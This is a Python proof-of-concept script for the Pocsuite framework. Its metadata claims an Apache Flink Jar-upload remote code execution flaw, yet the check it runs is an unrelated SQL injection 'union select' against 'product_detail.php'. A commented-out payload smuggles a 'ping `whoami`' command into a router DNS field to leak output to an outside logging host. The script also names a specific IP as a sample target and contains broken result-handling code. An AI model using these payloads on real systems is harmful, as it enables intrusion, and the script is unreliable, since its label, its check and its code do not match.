#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from urlparse import urljoin
from pocsuite.api.request import req
import time,sys,json,base64,argparse,trace,cStringIO,re


class TestPOC(POCBase):
    vulID = '98101'
    version = '1.0'
    author = 'co0ontty'
    vulDate = '2019-11-14'
    createDate = '2019-11-14'
    updateDate = '2019-11-14'
    references = ['https://www.seebug.org/vuldb/ssvid-98101']
    name = 'Apache Flink 任意 Jar 包上传导致远程代码执行漏洞'
    appPowerLink = 'https://flink.apache.org/'
    appName = 'Apache flink'
    appVersion = 'Apache Flink<=1.9.1'
    vulType = '代码执行'
    desc = '''
    攻击者可利用该漏洞在 Apache Flink Dashboard 页面中上传任意 Jar 包获取服务器最高权限。
    '''
    samples = ['http://54.77.247.43:8081']
    install_requires = ['']

    def _verify(self):
        result = {}
        target = self.url
        poc_path = urljoin(target,"product_detail.php?id=1+union+select+1,2,3,4,5,6--+--")
        print (poc_path)
        # headers = {
        #     "TE": "deflate,gzip;q=0.3",
        #     "Connection":" TE, close"
        # }
        # data = '''wanType%3d0%26adslUser%3d%26adslPwd%3d%26vpnServer%3d%26vpnUser%3d%26vpnPwd%3d%26vpnWanType%3d1%26dnsAuto%3d0%26staticIp%3d%26mask%3d%26gateway%3d%26dns1%3d8.8.8.8%26dns2%3d%3bping+%60whoami%60.ip.port.9xp4e7.ceye.io%3b%26module%3dwan1'''
        # if ".u.p.k." in req.get(poc,headers=headers).text:
        if req.get(poc_path).status_code == 200:
            result['VerifyInfo'] = {}
            result['VerifyInfo'] = self.url
            result['VerifyInfo']['text'] = req.get(poc_path).text
        
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
